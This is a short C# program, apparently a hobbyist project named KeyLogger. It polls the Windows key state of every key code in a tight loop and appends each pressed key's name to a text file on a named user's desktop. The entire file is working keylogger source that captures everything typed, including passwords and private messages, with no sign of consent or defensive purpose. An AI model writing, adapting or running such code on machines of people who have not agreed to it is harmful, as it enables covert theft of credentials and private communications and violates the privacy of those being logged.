using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;

namespace KeyLogger
{
    class Program
    {
        [ 
        DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            StreamWriter escrita;

            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        if (File.Exists(@"C:\Users\Lucas\Desktop\Key.txt"))
                        {
                            escrita = new StreamWriter(@"C:\Users\Lucas\Desktop\Key.txt", true);
                        }
                        else
                        {
                            escrita = new StreamWriter(@"C:\Users\Lucas\Desktop\Key.txt");
                        }
                        escrita.Write((Keys)i);
                        escrita.Close();
                        break;
                    }
                }
            }
        }
    }
}